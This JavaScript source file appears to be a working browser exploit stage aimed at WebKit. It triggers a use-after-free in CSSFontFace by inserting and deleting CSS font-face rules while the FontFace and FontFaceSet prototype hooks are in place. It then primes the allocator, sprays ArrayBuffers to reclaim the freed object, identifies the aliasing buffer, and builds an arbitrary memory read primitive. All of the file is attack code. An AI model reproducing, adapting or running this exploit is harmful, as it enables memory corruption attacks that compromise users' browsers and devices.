// userland.js — UAF + spray with freelist priming and target identification

const MEMORY_LIMIT_BYTES = 24 * 1024 * 1024;

// ─── Memory helpers ──────────────────────────────────────
function memUsage() {
  if (typeof performance !== "undefined" && performance.memory) {
    return {
      used:  performance.memory.usedJSHeapSize,
      total: performance.memory.totalJSHeapSize,
      limit: performance.memory.jsHeapSizeLimit,
    };
  }
  return null;
}

function memLog(label) {
  const m = memUsage();
  if (m) {
    logger.debug(
      `[mem:${label}] used=${(m.used / 1048576).toFixed(2)}MB ` +
      `total=${(m.total / 1048576).toFixed(2)}MB`
    );
  }
}

function assertMemoryHeadroom(extraBytes, stage) {
  const m = memUsage();
  if (!m) return;
  if (m.used + extraBytes > MEMORY_LIMIT_BYTES) {
    throw new Error(
      `OOM guard at ${stage}: need ${(extraBytes/1048576).toFixed(2)}MB, ` +
      `used ${(m.used/1048576).toFixed(2)}MB, cap ${(MEMORY_LIMIT_BYTES/1048576).toFixed(0)}MB`
    );
  }
}

function forceGC() {
  try { if (typeof gc === "function") { gc(); return; } } catch (_) {}
  // Fallback: allocate pressure to nudge the GC
  try {
    const pressure = new ArrayBuffer(16 * 1024 * 1024);
    if (pressure.byteLength !== 16 * 1024 * 1024) throw 0;
  } catch (_) {}
}

function probeFace(face) {
  if (!face) return null;
  const out = {};
  try { out.family = face.family; } catch (e) { out.family = `<err:${e.message.slice(0,20)}>`; }
  try { out.unicodeRange = face.unicodeRange; } catch (e) { out.unicodeRange = `<err:${e.message.slice(0,20)}>`; }
  try { out.status = face.status; } catch (e) { out.status = `<err:${e.message.slice(0,20)}>`; }
  return out;
}

// ─── init_rw ─────────────────────────────────────────────
async function init_rw(opts = {}) {
  const sprayCount    = opts.sprayCount    ?? 256;   // was 16
  const prewarmCount  = opts.prewarmCount  ?? 1024;  // freelist priming
  const loadTimeoutMs = opts.loadTimeoutMs ?? 3000;

  logger.info(
    `Initiate UAF (spray=${sprayCount}, prewarm=${prewarmCount}, ` +
    `timeout=${loadTimeoutMs}ms)`
  );
  memLog("start");

  // ── FontFace A ──
  const A = new FontFace("a", "local(sans-serif)", { unicodeRange: "U+0041" });
  document.fonts.add(A);
  void A.loaded;

  // ── Style element with rules ──
  const style = document.createElement("style");
  document.head.appendChild(style);

  const sprayRule =
    `@font-face{font-family:spray;src:local(monospace);unicode-range:U+0043}`;
  const uafRule =
    `@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042}`;

  const half = Math.floor(sprayCount / 2);

  for (let i = 0; i < half; i++) {
    try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); }
    catch (e) { throw new Error(`insertRule pre ${i}: ${e.message}`); }
  }

  const uafRuleIndex = style.sheet.cssRules.length;
  try { style.sheet.insertRule(uafRule, style.sheet.cssRules.length); }
  catch (e) { throw new Error(`insertRule victim: ${e.message}`); }

  for (let i = half; i < sprayCount; i++) {
    try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); }
    catch (e) { throw new Error(`insertRule post ${i}: ${e.message}`); }
  }

  void document.body.offsetTop;
  logger.debug("[uaf] CSSFontFace objects materialised");

  // ── Snapshot before free ──
  const faceSnapshot = [];
  let victim = null;
  for (const f of document.fonts) {
    faceSnapshot.push(f);
    if (!victim) {
      try { if (f.family === "b") victim = f; } catch (_) {}
    }
  }
  logger.debug(`[uaf] document.fonts has ${faceSnapshot.length} faces`);

  if (!victim) {
    throw new Error(`Victim FontFace "b" not found in document.fonts`);
  }
  const vp = probeFace(victim);
  logger.info(`Captured victim: family="${vp.family}" range="${vp.unicodeRange}"`);

  // ── Preparations ──
  const abs        = new Array(sprayCount);
  const abSize     = constants.wk_CSSFontFace_sizeof;
  const statusOff  = constants.wk_CSSFontFace_m_status;
  const tagOff     = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
  const payOff     = tagOff + 8;
  const origThen   = FontFace.prototype.then;
  const origLoad   = FontFaceSet.prototype.load;

  assertMemoryHeadroom(abSize * (sprayCount + prewarmCount) + 65536, "pre-spray");

  let freed = false;
  let freeError = null;
  let prewarmDone = 0;
  let sprayDone = 0;

  const doFreeWork = () => {
    if (freed) return;
    freed = true;
    logger.debug("[free] ENTER");

    // ── 1. Pre-warm fastMalloc free list with same-size slots ──
    try {
      const pre = new Array(prewarmCount);
      for (let i = 0; i < prewarmCount; i++) pre[i] = new ArrayBuffer(abSize);
      for (let i = 0; i < prewarmCount; i++) pre[i] = null;
      prewarmDone = prewarmCount;
      // Nudge the GC so the pre-warm buffers' backing stores actually return
      // to fastMalloc before we free the CSSFontFace.
      forceGC();
      logger.debug(`[free] pre-warmed ${prewarmCount} slots`);
    } catch (e) {
      logger.warn(`[free] pre-warm partial: ${e.message}`);
    }

    // ── 2. Delete victim's rule (frees CSSFontFace) ──
    try {
      style.sheet.deleteRule(uafRuleIndex);
      logger.debug("[free] victim rule deleted");
    } catch (e) {
      logger.error(`[free] deleteRule victim: ${e.message}`);
    }

    // ── 3. Delete neighbours ──
    for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
      const r = style.sheet.cssRules[i];
      if (r.cssText && r.cssText.indexOf("spray") !== -1) {
        try { style.sheet.deleteRule(i); } catch (_) {}
      }
    }
    logger.debug("[free] neighbour rules deleted");

    // ── 4. Detach style element ──
    try { style.remove(); } catch (_) {}
    try { document.head.removeChild(style); } catch (_) {}

    // ── 5. Force layout to trigger final destruction ──
    void document.body.offsetTop;

    // ── 6. Spray immediately, tight loop ──
    let allocated = 0;
    for (let i = 0; i < abs.length; i++) {
      try {
        const ab = new ArrayBuffer(abSize);
        const view = new DataView(ab);
        // refcount = 1 at offset 8
        view.setBInt(8, 1, true);
        // m_status = Success
        view.setUint8(statusOff, 3);
        // leave Variant tag at 0 (not pre-seeded) so identification works
        abs[i] = ab;
        allocated++;
      } catch (e) {
        freeError = `spray ${i}: ${e.message}`;
        logger.error(`[free] ${freeError}`);
        break;
      }
    }
    sprayDone = allocated;
    logger.debug(`[free] sprayed ${allocated}/${abs.length}`);
    logger.debug("[free] EXIT");
  };

  // ── Fallback then getter ──
  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (this === A) doFreeWork();
      return undefined;
    },
  });

  // ── Primary trigger: hook load ──
  let hookFired = false;
  FontFaceSet.prototype.load = function (font, text) {
    const p = origLoad.call(this, font, text);
    if (!hookFired) {
      hookFired = true;
      Promise.resolve().then(() => {
        try { doFreeWork(); }
        catch (e) { freeError = e.message; logger.error(`[hook] ${e.message}`); }
      });
    }
    return p;
  };

  logger.debug("[uaf] firing document.fonts.load");
  let loadPromise;
  try {
    loadPromise = document.fonts.load("1em a, b", "AB");
  } catch (e) {
    loadPromise = Promise.resolve([]);
  }
  loadPromise.catch(() => {});

  // Restore prototypes
  FontFaceSet.prototype.load = origLoad;
  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    value: origThen,
  });

  await Promise.race([
    loadPromise.catch(() => "rejected"),
    new Promise(r => setTimeout(() => r("timeout"), loadTimeoutMs)),
  ]);
  await Promise.resolve();

  logger.debug(`[uaf] freed=${freed} prewarm=${prewarmDone} spray=${sprayDone}`);
  if (freeError) throw new Error(`free work error: ${freeError}`);
  if (!freed) {
    throw new Error(`UAF free work never ran`);
  }

  memLog("post-uaf");

  // ── Check victim's state after free ──
  const after = probeFace(victim);
  logger.info(
    `[uaf] victim after free: family="${after.family}" ` +
    `range="${after.unicodeRange}" status="${after.status}"`
  );

  if (typeof after.family === "string" && after.family.startsWith("<err:")) {
    throw new Error(`Victim wrapper detached — C++ FontFace destroyed`);
  }

  // ── Identify which buffer aliases the freed CSSFontFace ──
  // Strategy: mutate each buffer's m_status, call victim.status, and
  // see which mutation flips the getter's return value. This works
  // because the wrapper reads m_status through its (now dangling)
  // reference to the CSSFontFace slot.
  logger.debug("[ident] scanning buffers for aliasing...");

  let uaf_ab = null;
  let uaf_ab_index = -1;

  const baselineStatus = (() => {
    try { return victim.status; } catch (_) { return null; }
  })();
  logger.debug(`[ident] baseline victim.status = "${baselineStatus}"`);

  // Alternate values guaranteed to differ from Success (3)
  const probeValues = [0, 5, 4, 2, 1]; // Unloaded, Error, Loading, Loaded, Loading

  outer:
  for (let i = 0; i < abs.length; i++) {
    const ab = abs[i];
    if (!ab) continue;

    let view;
    try { view = new DataView(ab); } catch (_) { continue; }

    for (const probeVal of probeValues) {
      let before, after2;
      try {
        before = victim.status;
      } catch (_) { continue outer; }

      try {
        view.setUint8(statusOff, probeVal);
      } catch (_) { continue outer; }

      try {
        after2 = victim.status;
      } catch (_) {
        view.setUint8(statusOff, 3);
        continue outer;
      }

      if (after2 !== before) {
        logger.debug(
          `[ident] buffer[${i}] is the alias ` +
          `(status "${before}" → "${after2}" via byte 0x${probeVal.toString(16)})`
        );
        uaf_ab = ab;
        uaf_ab_index = i;
        // restore status
        view.setUint8(statusOff, 3);
        break outer;
      }

      // not this one, restore
      view.setUint8(statusOff, 3);
    }
  }

  if (!uaf_ab) {
    // Diagnostic: dump statuses so we can see what's happening
    const statuses = [];
    for (let i = 0; i < Math.min(abs.length, 32); i++) {
      if (!abs[i]) { statuses.push("-"); continue; }
      try {
        const s = new DataView(abs[i]).getUint8(statusOff);
        statuses.push(s.toString(16));
      } catch (_) { statuses.push("?"); }
    }
    logger.error(`[ident] first 32 buffer status bytes: ${statuses.join(",")}`);
    logger.error(`[ident] baseline victim.status = "${baselineStatus}"`);
    throw new Error(
      `No buffer aliases the freed CSSFontFace — spray missed the slot.`
    );
  }

  logger.info(`Found aliased ArrayBuffer at index ${uaf_ab_index}`);

  // Free everything else
  for (let i = 0; i < abs.length; i++) {
    if (i !== uaf_ab_index) abs[i] = null;
  }
  faceSnapshot.length = 0;
  try { document.fonts.delete(A); } catch (_) {}

  memLog("post-reclaim");

  // ── Read primitive ──
  const self = {
    uaf_ab,
    uaf_font: victim,
    probe: () => probeFace(victim),

    read(addr, size) {
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);
      const uaf_view = new DataView(self.uaf_ab);

      const useWorkaround = version.major >= 13;

      let offset = 0;
      while (offset < size) {
        const ptr = addr.add(offset);

        if (useWorkaround) {
          uaf_view.setUint8(tagOff, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
          for (let i = 1; i < 8; i++) uaf_view.setUint8(tagOff + i, 0);
          uaf_view.setBInt(payOff, ptr, true);
        } else {
          uaf_view.setBInt(
            constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
          uaf_view.setInt32(
            constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true);
          uaf_view.setInt32(
            constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true);
        }

        let chunk = "";
        try {
          chunk = self.uaf_font.featureSettings || "";
        } catch (e) {
          throw new Error(`featureSettings getter threw: ${e.message}`);
        }

        if (chunk.length < 5) {
          throw new Error(
            `featureSettings returned short string: ${JSON.stringify(chunk)} ` +
            `(workaround=${useWorkaround})`
          );
        }

        for (let i = 1; i < 5; i++) {
          u8[offset++] = chunk.charCodeAt(i) & 0xff;
        }
      }

      return ab;
    },

    read8(addr) {
      const ab = self.read(addr, 8);
      return new DataView(ab).getBInt(0, true);
    },

    cleanup() {
      try { document.fonts.clear(); } catch (_) {}
      self.uaf_ab = null;
      self.uaf_font = null;
    },
  };

  return self;
}
